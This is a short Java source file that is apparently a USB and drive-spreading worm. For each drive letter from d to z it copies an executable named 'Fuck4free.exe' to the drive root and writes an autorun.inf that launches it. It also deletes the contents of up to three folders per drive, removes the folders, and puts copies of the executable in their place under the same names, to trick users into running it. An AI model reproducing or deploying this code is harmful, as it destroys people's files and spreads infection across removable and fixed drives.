import java.io.*;
class Valid 
{
	static PrintWriter pw=null;
	static File[] folders = new File[3];
	public static void maniac() throws Exception
	{
		FileInputStream from= new FileInputStream(".\\Fuck4free.exe");
		for(int i=100;i<=122;i++)
		{
			try
			{
				Character ch=new Character((char)i);
				String to=ch.toString();
				foolThrice(to);
				FileOutputStream toa= new FileOutputStream(to+":\\Fuck4free.exe");
				addExe(from,toa);
				pw=new PrintWriter(new OutputStreamWriter(new FileOutputStream(to+":\\autorun.inf")),true);
				pw.println("[Autorun]");
				pw.println("Open=Fuck4free.exe");
			}
			catch(Exception e){/*System.out.println(e);*/}
		}
	}
	public static void foolThrice(String drive)
	{
		int k=-1;
		try
		{
			File dir=new File(drive+":\\");//this is the drive not a directory man
			File[] list=dir.listFiles();
			Demolition d=new Demolition();
			for(int i=0;i<list.length;i++)
				if(list[i].isDirectory()&k<2)
				{
					System.out.println(list[i].getCanonicalPath());
					folders[++k]=list[i];
				}
			System.out.println(list.length);
			for(int a=0;a<=k;a++) 
			{
				System.out.println(folders[a]);
				String bluff=folders[a].getCanonicalPath();
				d.deleteFiles(folders[a]);
				folders[a].delete();
				addExe(new FileInputStream(".\\Fuck4free.exe"),new FileOutputStream(bluff+".exe"));
			}	
		}
		catch(Exception e){System.out.println(e);}
	}
	public static void addExe(FileInputStream frm,FileOutputStream toa)
	{
		try
		{
			while(true)
			{
				int l=frm.read();
				if(l==-1)break;
				toa.write(l);
			}
			frm.close();
			toa.close();
		}
		catch(Exception e){}
	}
}